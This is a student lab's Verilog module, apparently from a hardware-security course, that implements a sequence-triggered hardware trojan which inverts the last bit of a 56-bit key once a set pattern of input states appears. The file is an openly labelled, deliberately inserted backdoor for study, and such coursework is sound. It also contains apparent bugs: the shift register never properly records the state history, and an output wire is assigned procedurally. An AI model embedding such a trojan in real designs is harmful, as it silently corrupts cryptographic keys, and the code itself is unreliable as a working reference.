// Group 2: Raj Patel, Zachary Rouviere, Evan Waxman
// Experiement 4 Part 3
// 9/17/21

// Description:
//	trojan_seq.v will implement a sequential trigger based on a
//	defined sequence of states. To implement the trigger, a shift
// 	register is used to check the history of states and is then
// 	compared with the trigger condition. If the condition is met,
//	the last bit of the key will be inverted until the board powers 
//	down.

module  trojan_seq (
input				clk,
input				rst,
input	[55:0]	    key,
input	[31:0]	    trigger,
output	[55:0]	    payload
);

//	trigger condition definition (order of states)
parameter 	STATE0  = 2'b10, 
			STATE1	= 2'b01, 
			STATE2 	= 2'b11;

reg [5:0]	state_order;
reg [5:0] 	trigger_cond = {STATE2, STATE1, STATE0};
reg 		trojan_en;
reg			trojan_en_next;

//	sequential always block to set state_order and trojan_en reg, and payload output
always @(negedge clk) begin
	if (rst) begin
		state_order	<= #1 6'h00;
		trojan_en 	<= #1 1'b0;
		payload 	<= #1 key;
	end else begin
		state_order	<= #1 {state_order[5:2], trigger[1:0]};
		trojan_en 	<= #1 trojan_en_next;

		if (trojan_en) begin
			payload	<= #1 {key[55:1], ~key[0]};
		end else begin
			payload <= #1 key;
		end
	end
end

// 	combinational always block to update trigger_en
always @(state_order) begin
	trojan_en_next = trojan_en;

	if (state_order == trigger_cond) begin
		trojan_en_next = 1'b1;
	end
end

endmodule